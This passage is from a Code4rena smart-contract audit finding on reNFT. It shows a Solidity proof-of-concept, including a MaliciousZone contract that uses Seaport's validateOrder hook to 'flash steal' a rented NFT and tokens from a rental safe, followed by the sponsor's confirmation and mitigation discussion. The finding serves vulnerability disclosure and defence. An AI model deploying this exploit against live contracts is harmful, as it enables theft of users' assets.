            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);

            // build up the advanced orders
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                advancedOrders[i] = ordersToFulfill[i].advancedOrder;
            }
        }






        // A helper function to generate a signature for a rental order created by a rental safe smart contract.
        // Bob's rental safe will be the offerer of the malicious rental order.
        function _signSeaportOrderForGnosisSafeBeingALender(
            ProtocolAccount memory _offerer,
            OfferItem[] memory _offerItems,
            ConsiderationItem[] memory _considerationItems,
            OrderMetadata memory _metadata
        ) private returns (Order memory order, bytes32 orderHash) {
            // put offerer address on stack
            address offerer = _offerer.addr;

            // Build the order components
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault(STANDARD_ORDER_COMPONENTS)
                .withOfferer(offerer)
                .withOffer(_offerItems)
                .withConsideration(_considerationItems)
                .withZoneHash(create.getOrderMetadataHash(_metadata))
                .withCounter(seaport.getCounter(offerer));

            // generate the order hash
            orderHash = seaport.getOrderHash(orderComponents);

            // generate the signature for the order components
            bytes memory signature = _signSeaportOrderWithGnosisSafeBeingTheLender(_offerer.privateKey, orderHash);

            // create the order, but dont provide a signature if its a PAYEE order.
            // Since PAYEE orders are fulfilled by the offerer of the order, they
            // dont need a signature.
            if (_metadata.orderType == OrderType.PAYEE) {
                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());
            } else {
                order = OrderLib
                    .empty()
                    .withParameters(orderComponents.toOrderParameters())
                    .withSignature(signature);
            }

        }

        function _signSeaportOrderWithGnosisSafeBeingTheLender(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            bytes32 messageHash = fallbackPolicy.getMessageHashForSafe(bob.safe, abi.encodePacked(domainSeparator.toTypedDataHash(orderHash)));

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                bob.privateKey,
                messageHash
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);

        }


        function _signOrder(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private view returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(orderHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);

        }



    }









    contract MaliciousZone {

        address private owner; // address of the attacker (bob.addr)
        address private attackersSafe; // address of the attacker's rental safe (bob.safe)
        address private stopPolicy; // the address of the ReNFT stop policy
        address private createPolicy; // the address of the ReNFT create policy
        address private erc721ToHijack; // the address of the ERC721 token to flash steal
        address private erc20ToHijack; // the address of the ERC20 token to flash steal
        

        bytes private stopRentTXCalldata; // calldata of the stopRent() TX which will be made
        bytes private stopRentTXSignature; // Signature of the stopRent() TX which will be made
        bytes private transferFromERC721TXCalldata; // calldata of the ERC721 transferFrom() TX which will be made
        bytes private transferFromERC721Signature; // Signature of the ERC721 transferFrom() TX which will be made
        bytes private transferFrom20TXCalldata; // calldata of the ERC20 transfer() TX which will be made
        bytes private transferFrom20TXSignature; // Signature of the ERC20 transfer() TX which will be made

        constructor(address _attackersSafe, address _stopPolicy, address _createPolicy, address _erc721ToHijack, address _erc20ToReturn) {
            attackersSafe = _attackersSafe;
            stopPolicy = _stopPolicy;
            createPolicy = _createPolicy;
            erc721ToHijack = _erc721ToHijack;
            erc20ToHijack = _erc20ToReturn;
            owner = msg.sender;
        }

        // A setter function to set the signature for a TX where the malicious self-rental will be stopped
        function setStopRentTXSignature(bytes memory _signature) external onlyOwner {
            stopRentTXSignature = _signature;
            
        }
        // A setter function to set the calldata for a TX where the malicious self-rental will be stopped
        function setStopRentTXCalldata(bytes memory _stopRentTXCalldata) external onlyOwner {
            stopRentTXCalldata = _stopRentTXCalldata;
        } 

        // A setter function to set the signature for a TX where the flash stolen token will be transfered from the rental safe to this zone contract
        function setTransferFromERC721TXSignature(bytes memory _signature) external onlyOwner {
            transferFromERC721Signature = _signature;   
        }

        // A setter function to set the calldata for a TX where the flash stolen token will be transfered from the rental safe to this zone contract
        function setTransferFromERC721TXCalldata(bytes memory _transferTXCalldata) external onlyOwner {
            transferFromERC721TXCalldata = _transferTXCalldata;
        }

        // A setter function to set the signature for a TX where the flash stolen ERC20 token in the order will be transfered from the rental safe to this zone contract
        function setTransferFromERC20TXSignature(bytes memory _signature) external onlyOwner {
            transferFrom20TXSignature = _signature;   
        }

        // A setter function to set the calldata for a TX where the flash stolen ERC20 token in the order will be transfered from the rental safe to this zone contract
        function setTransferFromERC20TXCalldata(bytes memory _transferTXCalldata) external onlyOwner {
            transferFrom20TXCalldata = _transferTXCalldata;
        }



        function validateOrder(
            ZoneParameters calldata zoneParams
        ) external returns (bytes4 validOrderMagicValue) {
    
            // Stop the malicious order rental.
            SafeUtils.executeTransaction(
                address(attackersSafe),
                address(stopPolicy),
                stopRentTXCalldata,
                stopRentTXSignature
            );

            // Transfer the token from the rental safe to this zone contract.
            SafeUtils.executeTransaction(
                address(attackersSafe),
                address(erc721ToHijack),
                transferFromERC721TXCalldata,
                transferFromERC721Signature
            );

            // Transfer the ERC20 tokens back to the Create Policy to allow for the legitimate order to be executed normally.
            SafeUtils.executeTransaction(
                address(attackersSafe),
                address(erc20ToHijack),
                transferFrom20TXCalldata,
                transferFrom20TXSignature
            );

            // Confirm that the zone contract owns the NFT and can do whatever it wants with it
            address ownerOfNFT = IERC721(erc721ToHijack).ownerOf(1);

            if (ownerOfNFT == address(this)) {
                console.log("The intermediary zone contract owned by the attacker now owns the NFT and can do whatever it wants with it!");

                // Do whatever you want and bypass the hooks
                // ..........

                // Transfer the NFT back to the create policy
                IERC721(erc721ToHijack).transferFrom(address(this), createPolicy, 1);


            }

            // Return the selector of validateOrder as the magic value.
            validOrderMagicValue = ZoneInterface.validateOrder.selector;
        }


        modifier onlyOwner {
            require(owner == msg.sender);
            _;
        }
    }

</details>

### Remediation

I believe one way to go about this is to ensure there is no discrepancy between the size of the `items` array and the `seaport.totalExecutions()` array.

### Assessed type

Access Control

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/29#issuecomment-1979671139):**
> This issue is confirmed, assets can be flash stolen. Because `seaportPayload.totalExecutions` contains the array for all executions that occurred during the bundle of orders that were fulfilled, it will not be enough to check that the size of the `items` array is the same as the total executions, since total executions will usually be larger.
>
> Instead, I feel that the best way to prevent this exploit and similar exploits is to prevent `_executionInvariantChecks()` from being bypassed by requiring that the offerer of any order cannot be the rental safe that is receiving the items. This would ensure an execution is logged by seaport.
>
> Additionally, as an extra measure of safety, I think the contracts should prevent stopping any order where `block.timestamp == rentalOrder.startTime`.
>
> Thoughts on these mitigations, @sin1st3r__?

**[sin1st3r__ (warden) commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/29#issuecomment-1979675065):**
> @Alec1017 - I believe both mitigations you mentioned are very good and will break this exploit. I would personally go with the first mitigation you suggested although it's harder to implement than the second ones, because who knows how many issues the bypassed `_executionInvariantChecks()` could lead to in the future as more and more code and features gets pushed to the codebase.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
